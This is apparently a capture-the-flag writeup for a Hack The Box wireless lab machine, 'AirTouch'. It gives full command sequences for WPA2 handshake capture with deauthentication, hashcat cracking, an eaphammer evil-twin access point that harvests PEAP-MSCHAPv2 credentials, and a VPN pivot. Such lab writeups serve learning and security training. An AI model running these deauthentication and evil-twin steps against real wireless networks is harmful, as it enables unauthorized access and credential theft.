---
layout: default
title: "AirTouch"
parent: Hard Machines
grand_parent: Machines
permalink: /machines/hard/airtouch/
---

# AirTouch

![Machine Badge](https://img.shields.io/badge/Machine-AirTouch-blue)
![OS](https://img.shields.io/badge/OS-Linux-orange)
![Difficulty](https://img.shields.io/badge/Difficulty-Hard-orange)

| Property | Value |
|----------|-------|
| **OS** | Linux (Ubuntu) |
| **Difficulty** | Hard (categorised Insane on some boards) |
| **Release** | 2026-04-18 |
| **Tags** | #802.11 #wpa2-psk #evil-twin #peap-mschapv2 #eaphammer #aircrack-ng #wifi |

---

## Summary

AirTouch is a rare **wireless-focused** HTB machine. The attack requires capturing an **802.11 WPA2-PSK 4-way handshake**, cracking it with `hashcat -m 22000`, then standing up an **Evil Twin** access point (via `eaphammer`) to harvest **PEAP-MSCHAPv2** credentials from a connecting client. The cracked enterprise creds grant access to a VPN, from which the internal subnet is reached. Standard Linux privesc finishes the chain.

---

## External Writeups

- [0xdf - HTB AirTouch](https://0xdf.gitlab.io/2026/04/18/htb-airtouch.html)

---

## Key Techniques

- 802.11 monitor mode (`airmon-ng start`, `iw dev`)
- WPA2 4-way handshake capture (`airodump-ng`, `tcpdump`, `hcxdumptool`)
- Deauthentication attack (`aireplay-ng -0`, `mdk4 d`)
- Handshake -> `.hccapx` / `.22000` for hashcat
- `hashcat -m 22000` (modern WPA2 mode replacing -m 2500)
- Evil-twin AP setup with `eaphammer` / `hostapd-wpe`
- PEAP-MSCHAPv2 credential harvesting + crack with `asleap` / `hashcat -m 5500`
- IPSec/OpenVPN client config recovery and pivot
- Linux privesc via writable systemd / cron

---

## Attack Path

### 1. Wireless Interface in Monitor Mode

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# -> wlan0mon
iwconfig wlan0mon
```

### 2. Capture WPA2 Handshake

```bash
sudo airodump-ng wlan0mon
# Note BSSID and CH of target SSID, e.g. AIRTOUCH_HOME on ch 6
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon &
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c <client_mac> wlan0mon
# Wait for "WPA handshake: AA:BB:CC:DD:EE:FF" in airodump
```

Convert and crack:

```bash
hcxpcapngtool -o cap.22000 cap-01.cap
hashcat -m 22000 cap.22000 /usr/share/wordlists/rockyou.txt
# AIRTOUCH_HOME : <psk>
```

### 3. Associate to Network

```bash
sudo wpa_passphrase AIRTOUCH_HOME '<psk>' > wpa.conf
sudo wpa_supplicant -B -i wlan0 -c wpa.conf
sudo dhclient wlan0
```

### 4. Evil Twin + PEAP-MSCHAPv2 Harvest

Discover a corp enterprise SSID (`AIRTOUCH_CORP`) using PEAP-MSCHAPv2. Set up rogue AP:

```bash
./eaphammer --auth peap --essid AIRTOUCH_CORP \
            --interface wlan1 -i wlan0 --creds
```

When a client roams to the rogue AP, you get:

```
user@airtouch.htb  challenge: <c>  response: <r>
```

Crack offline:

```bash
hashcat -m 5500 ntlm.txt /usr/share/wordlists/rockyou.txt
# user@airtouch.htb : <password>
```

### 5. VPN Pivot

```bash
sudo openvpn --config airtouch.ovpn --auth-user-pass <(echo -e "user@airtouch.htb\n<password>")
# Internal subnet now reachable (10.x.y.0/24)
```

### 6. Internal Linux Privesc

Standard checklist: `sudo -l`, SUID binaries, writable systemd units, `cron`, exposed Docker socket, kernel exploit if old kernel.

---

## Lessons Learned

- HTB wireless boxes assume you have a **compatible USB wifi adapter** (Alfa AWUS036ACH or similar) in monitor + injection mode.
- Always prefer **`hashcat -m 22000`** over the legacy `-m 2500` for WPA2 in 2026.
- `eaphammer` (or `hostapd-wpe` + `freeradius-wpe`) is the canonical PEAP-MSCHAPv2 harvest stack.
- PEAP-MSCHAPv2 is *still* deployed in 2026 despite being weakened to a single DES brute-force by `asleap` since 2012.
- The "wireless" portion of HTB challenges typically converts to **classical pivoting** the moment you obtain VPN credentials - same Linux priv-esc playbook applies.

---

## References

- WPA2 KRACK + handshake capture theory
- `eaphammer` docs: https://github.com/s0lst1c3/eaphammer
- `hcxdumptool` modern capture: https://github.com/ZerBea/hcxdumptool
